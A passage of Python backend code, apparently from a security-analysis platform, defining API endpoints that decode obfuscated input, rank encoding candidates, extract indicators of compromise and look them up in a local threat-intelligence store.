    # byte-identical (§1.1.6). Composition failures never break the
    # endpoint — CIO block is dropped silently and legacy shape returned.
    # See /app/memory/adr/0014-canonical-investigation-object.md.
    # ═══════════════════════════════════════════════════════════════════
    try:
        from nivxforge.cim.fact_substrate import from_analysis_result as _cio_facts
        from nivxforge.investigation import build_cio as _build_cio
        _cio_fs = _cio_facts(
            result,
            input_text=(body.input if hasattr(body, "input") else ""),
            source_endpoint="/api/decode/smart",
        )
        _cio = _build_cio(_cio_fs)
        # Preserve the ORIGINAL vendor payload for the graph-only
        # Incident Narrative Engine. `body.input` has already been
        # replaced with the ingress-gate canonical stream at this point,
        # so we stash the pre-gate raw text separately.
        try:
            _cio.metadata["raw_input"] = _original_raw_input
        except Exception:  # noqa: BLE001
            pass
        # 2026-08-01 operator directive: `_build_cio` composed the
        # summary WITHOUT `metadata.raw_input`, so the graph-only
        # Incident Narrative Engine could not run. Now that raw_input
        # is available, invalidate the stale phase1 caches and
        # RE-COMPOSE the summary so every prose surface reads from the
        # Investigation Graph.
        try:
            _cio.metadata.pop("phase1_state", None)
            _cio.metadata.pop("phase1_narrative", None)
            from nivxforge.investigation.summary_composer import compose_summary as _recompose
            _cio.summary = _recompose(_cio)
        except Exception:  # noqa: BLE001
            log.exception("phase1 summary re-composition failed (safe — first-pass summary kept)")
        # ADR-0014 §1.1.14 Layer 2 · attach ingress-gate provenance so
        # G4 (`G4_NORMALISATION_REQUIRED`) accepts the CIO.
        if _ingress_provenance:
            _cio.metadata["normalised_via"] = _ingress_provenance
        # Input Understanding Engine · stamp "what did I receive?"
        # into cio.metadata.input_understanding so every downstream
        # surface (topbar badge, analyst prose, correlation card)
        # can display the classification without recomputing it.
        try:
            from nivxforge.investigation.input_understanding import understand as _iue
            _cio.metadata["input_understanding"] = _iue(
                (body.input if hasattr(body, "input") else "")
            )
        except Exception:  # noqa: BLE001
            log.exception("IUE classification failed (safe — CIO returned without input_understanding)")
        # Stash Workspace-parity intelligence into cio.metadata so the
        # X-Lab Rules / LOLBAS / TI-HITS lenses (renderers only) can
        # project the same data Workspace already renders. No new
        # engines — just field passthrough.
        try:
            for _k in ("custom_recipes_matched", "recipes_matched", "rules_hit",
                       "lolbas", "lolbins_v2", "ti_shield", "ti_hits", "yara",
                       "sigma", "iocs"):
                if _k in result and result[_k] is not None:
                    _cio.metadata[_k] = result[_k]
        except Exception:  # noqa: BLE001
            pass
        # P1-02b · After stashing Workspace-parity metadata, re-run the
        # verdict engine so Rules · LOLBAS · Recipes · TI are folded in.
        try:
            from nivxforge.investigation.verdict_engine import refresh_verdict as _refresh_v
            _refresh_v(_cio)
        except Exception:  # noqa: BLE001
            log.exception("P1-02b · verdict refresh failed (safe — using pre-metadata verdict)")
        # P2-05d · Recursive Command Investigation — fixed-point loop
        # over the ArtifactQueue. Never raises; on budget exhaustion
        # returns a partial status but a fully-valid CIO.
        try:
            from nivxforge.investigation.recursive import recursively_investigate as _recurse
            _recurse(_cio, seed_content=(getattr(body, "input", "") or "")[:8192],
                     seed_kind="command", policy="standard")
        except Exception:  # noqa: BLE001
            log.exception("P2-05d · recursive investigation failed (safe — non-recursive CIO returned)")
        # P1-01 · Live OSINT wiring — same _osint_lookup + enrich_iocs
        # services Workspace uses. Populates `cio.metadata.osint` +
        # per-IOC-node `attrs.enrichment.providers[]` (11-field cards).
        # Best-effort — never breaks the endpoint.
        try:
            from nivxforge.investigation.osint_enricher import enrich_cio as _enrich_cio
            _keys = await load_osint_keys()
            await _enrich_cio(_cio, keys=_keys)
            # OSINT enrichment can flip IOC nodes to confirmed_malicious_*
            # (CRITICAL class) — refresh the verdict once more so those
            # promotions actually land in `cio.verdict`.
            try:
                from nivxforge.investigation.verdict_engine import refresh_verdict as _refresh_v
                _refresh_v(_cio)
            except Exception:  # noqa: BLE001
                log.exception("P1-02b · post-OSINT verdict refresh failed")
        except Exception:  # noqa: BLE001
            log.exception("P1-01 · OSINT enrichment failed (safe — CIO returned without OSINT block)")
        result["cio"] = _cio.model_dump(mode="json")
    except Exception:  # noqa: BLE001
        log.exception("ADR-0014 · CIO composition failed (safe — legacy response preserved)")

    # ── ARB Rules 12, 15 · guarantee canonical response shape ──────────
    # `risk` is a projection of `verdict_card`; `semantic.review_signal`
    # is exposed alongside legacy `semantic.verdict`. Idempotent.
    try:
        from verdict_projection import (
            ensure_canonical_response,
            promote_semantic_review_signal,
        )
        ensure_canonical_response(result)
        promote_semantic_review_signal(result)
    except Exception:
        pass

    return result
class CandidatesIn(BaseModel):
    input: str
    top_n: int = 8


@router.post("/decode/candidates")
async def decode_candidates(body: CandidatesIn, user=Depends(get_current_user)):
    """Return the RANKED encoding-candidate list for an input.

    Feb-2026 Candidate-Scoring Engine: every registered encoding is scored
    dynamically against the input based on alphabet validity, length rules,
    entropy, decode success, output printability, file signatures, and
    malware indicators. If no candidate reaches MIN_ACCEPT, an
    ``unknown-or-identifier`` verdict is returned with hypotheses (hash /
    UUID / random token / unsupported encoding).

    Output format (per Feb-2026 spec):
        - candidates[]            ranked list with per-candidate evidence
        - best                    top candidate (or None)
        - verdict                 decoded | possible | unknown-or-identifier
        - hex_representation      hex of the best decoded output
        - readability_score       linguistic score of best output
        - signature               file/binary signature (if detected)
        - iocs                    extracted URLs / IPs / domains / hashes / paths
        - lolbins                 detected LOLBins from the winning output
        - mitre_techniques        MITRE ATT&CK mappings
        - explanation             why this encoding was chosen over alternatives
    """
    from reasoning.candidate_engine import (
        score_candidates, classify_unknown, best_candidate,
        HIGH_THRESHOLD, MIN_ACCEPT,
    )
    top_n = max(1, min(int(body.top_n or 8), 20))
    cands = score_candidates(body.input, top_n=top_n)
    best = best_candidate(body.input)
    # Build structured candidate dicts. WINNER gets `as_dict` (no runner-up
    # comparison), all OTHERS get `as_rejected_dict(winner)` so the
    # frontend can render "why not Y?" tooltips.
    candidate_dicts: List[Dict[str, Any]] = []
    for c in cands:
        if best is not None and c.op == best.op:
            candidate_dicts.append(c.as_dict())
        else:
            candidate_dicts.append(c.as_rejected_dict(winner=best))
    payload: Dict[str, Any] = {
        "input_length": len(body.input),
        "candidates": candidate_dicts,
        "best": best.as_dict() if best else None,
        "thresholds": {
            "high": HIGH_THRESHOLD,
            "min_accept": MIN_ACCEPT,
        },
    }
    if best is None:
        payload["verdict"] = classify_unknown(body.input).as_dict()
        payload["hex_representation"] = None
        payload["readability_score"] = None
        payload["signature"] = None
        payload["iocs"] = {}
        payload["lolbins"] = []
        payload["mitre_techniques"] = []
        payload["explanation"] = (
            "No encoding candidate reached the minimum-acceptance threshold "
            f"({MIN_ACCEPT}). See `verdict.hypotheses` for likely alternatives "
            "(hash / UUID / random token / unsupported encoding)."
        )
        return payload

    payload["verdict"] = {
        "verdict": "decoded" if best.confidence >= HIGH_THRESHOLD else "possible",
        "op": best.op,
        "confidence": best.confidence,
        "rationale": best.rationale,
    }

    # ── Full output enrichment on the winning candidate's output ────
    decoded = best.decoded or ""
    try:
        raw = decoded.encode("latin-1", errors="replace") \
            if all(ord(c) < 256 for c in decoded) \
            else decoded.encode("utf-8", errors="replace")
    except Exception:
        raw = b""
    payload["hex_representation"] = raw.hex(" ")
    payload["readability_score"] = round(
        (best.evidence.get("linguistic_score") or 0.0), 4
    )
    payload["signature"] = best.evidence.get("signature")

    # IOCs / MITRE / LOLBins from the DECODED text
    from operations import extract_iocs, mitre_map
    try:
        payload["iocs"] = extract_iocs(decoded)
    except Exception:
        payload["iocs"] = {}
    try:
        payload["mitre_techniques"] = mitre_map(decoded)
    except Exception:
        payload["mitre_techniques"] = []
    try:
        from lolbas import scan_lolbas
        payload["lolbins"] = scan_lolbas(decoded)
    except Exception:
        payload["lolbins"] = []

    # ── "Why this over alternatives" explanation ─────────────────
    # Compare best against the runner-up and articulate the delta.
    if len(cands) >= 2:
        runner = cands[1]
        confidence_gap = round(best.confidence - runner.confidence, 4)
        payload["explanation"] = (
            f"Selected {best.op} (confidence={best.confidence:.2f}) over "
            f"{runner.op} (confidence={runner.confidence:.2f}) — "
            f"gap={confidence_gap:+.2f}. Rationale: {best.rationale} "
            f"| Runner-up rationale: {runner.rationale}"
        )
    else:
        payload["explanation"] = (
            f"Selected {best.op} (confidence={best.confidence:.2f}) — "
            f"only candidate above minimum threshold. {best.rationale}"
        )

    # ── Investigation timeline (Feb-2026 #5): log a "decode" event so
    # the analyst can replay the full lifecycle for this input later.
    try:
        from timeline import record as _tl_record
        await _tl_record(
            db,
            kind="decode",
            title=f"Decoded {best.op} → {(best.decoded or '')[:60]}",
            input_text=body.input,
            actor=user.get("email"),
            summary=(
                f"op={best.op} confidence={best.confidence:.2f} "
                f"verdict={payload['verdict']['verdict']}"
            ),
            metadata={
                "op": best.op,
                "confidence": best.confidence,
                "verdict": payload["verdict"]["verdict"],
                "hex": (payload.get("hex_representation") or "")[:120],
                "iocs": payload.get("iocs") or {},
                "mitre": [t.get("id") for t in (payload.get("mitre_techniques") or [])],
            },
            severity="success" if best.confidence >= 0.65 else "info",
        )
    except Exception:
        pass

    return payload




def _reason_for_op(op: str) -> str:
    """Human-friendly explanation for why the deterministic decoder picked this op."""
    return {
        "extract-payload": "Isolated payload string from script/command wrapper",
        "base64-decode": "Base64-encoded payload detected",
        "base64-gzip": "Base64 → GZIP magic-byte sequence detected (1f 8b)",
        "base64-zlib": "Base64 → ZLIB magic-byte sequence detected (78 xx)",
        "gzip-decompress": "GZIP-compressed layer",
        "zlib-decompress": "ZLIB-compressed layer",
        "lzma-decompress": "LZMA / XZ compressed layer",
        "bzip2-decompress": "BZIP2-compressed layer",
        "hex-decode": "Hex-encoded printable payload",
        "url-decode": "URL percent-encoded characters",
        "html-decode": "HTML entity encoding detected",
        "powershell-encoded": "PowerShell -EncodedCommand base64 (UTF-16LE)",
        "powershell-deobfuscate": "PowerShell tick / [char[]] obfuscation",
        "cmd-deobfuscate": "CMD.exe caret obfuscation",
        "refang-iocs": "Defanged IOCs (hxxp / [.] / [@])",
        "js-charcode": "JavaScript String.fromCharCode()",
        "js-charcode-decode": "JavaScript String.fromCharCode() blocks",
        "js-hex-strings-decode": r"JavaScript \xNN hex string escapes",
        "js-unescape": "JavaScript \\xNN hex escapes",
        "unicode-escape": "\\uNNNN unicode escapes",
        "utf16le-decode": "UTF-16LE byte pattern",
        "xor": "Single-byte XOR key recovered from wrapper",
        "xor-brute": "Multi-byte XOR key recovered via English-density + downstream-magic brute force",
        "env-expand": "Resolved %TEMP% / $env:* / ${HOME} placeholders",
        "extract-base64": "Extracted embedded base64 blob(s) from wrapper text",
    }.get(op, f"Applied {op}")


# ─── Input Understanding Engine (public endpoint) ────────────────────
# The frontend calls this immediately on paste so the single
# "INVESTIGATE" button can resolve the correct pipeline route
# (v2/auto-investigate vs decode/smart) automatically. This is a
# lightweight classifier — no decoding, no IOC extraction, no verdict.

class UnderstandIn(BaseModel):
    input: str


@router.post("/understand")
async def understand_input(body: UnderstandIn, user=Depends(get_current_user)):
    """Classify an arbitrary input string. Returns:
        { type, label, confidence, fingerprints[], route, size_bytes, line_count }
    """
    from nivxforge.investigation.input_understanding import understand as _iue
    return _iue(body.input or "")


# ─── OSINT · Threat-Intel Lookup (public endpoint) ────────────────────
# Lab v2's OSINT lens calls this after every investigation to enrich
# every IOC with the reputation records already stored in `db.iocs`
# by the ti_feed_sync pipeline (URLhaus / Feodo / BlocklistDE / OTX /
# ThreatFox / MalwareBazaar / AbuseIPDB / VirusTotal).  Same code path
# Workspace uses at `/api/v2/auto-investigate` — factored so Lab v2 can
# call it independently. Best-effort: swallows errors so a TI outage
# never breaks the workspace.

class OSINTLookupIn(BaseModel):
    urls: List[str] = []
    domains: List[str] = []
    ips: List[str] = []
    sha256: List[str] = []
    sha1: List[str] = []
    md5: List[str] = []


@router.post("/osint/lookup")
async def osint_lookup(body: OSINTLookupIn, user=Depends(get_current_user)):
    """Look up every submitted IOC in the local `db.iocs` collection
    and return per-IOC reputation records (sources, severity,
    confidence, malware families, first/last seen). Empty when no
    matches. Shape matches Workspace's `_osint_lookup`."""
    from routers.auto_investigate import _osint_lookup as _look
    iocs = {
        "urls": body.urls,
        "domains": body.domains,
        "ips": body.ips,
        "sha256": body.sha256,
        "sha1": body.sha1,
        "md5": body.md5,
    }
    return await _look(entities={}, iocs=iocs)
